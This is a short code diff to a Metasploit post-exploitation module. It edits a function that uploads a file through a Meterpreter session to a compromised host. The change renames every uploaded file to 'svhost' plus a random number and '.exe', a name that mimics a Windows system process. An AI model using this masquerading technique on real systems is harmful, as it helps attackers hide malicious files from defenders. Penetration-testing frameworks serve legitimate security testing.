@@ -82,7 +82,7 @@ class Metasploit4 < Msf::Post
   def upload(session, file, trgloc="")
     @location = ""
     @file_name = ""
-    @file_on_target = ""
+    file_on_target = ""
     @clean_up = ""
     if not ::File.exists?(file)
       raise "File to Upload does not exists!"
@@ -92,14 +92,11 @@ class Metasploit4 < Msf::Post
       else
         @location = trgloc
       end
-      ext = file[file.rindex(".") .. -1]
-      if ext and ext.downcase == ".exe"
-        @file_name  = "svhost#{rand(100)}.exe"
-        @file_on_target = "#{@location}\\#{@file_name}"
-      end
+      @file_name  = "svhost#{rand(100)}.exe"
+      file_on_target = "#{@location}\\#{@file_name}"
       print_status("Uploading #{file}....")
       begin
-        upload_file("#{@file_on_target}","#{file}")
+        upload_file("#{file_on_target}","#{file}")
       rescue ::Rex::Post::Meterpreter::RequestError => e
         fail_with(Failure::NotFound, e.message)
       end
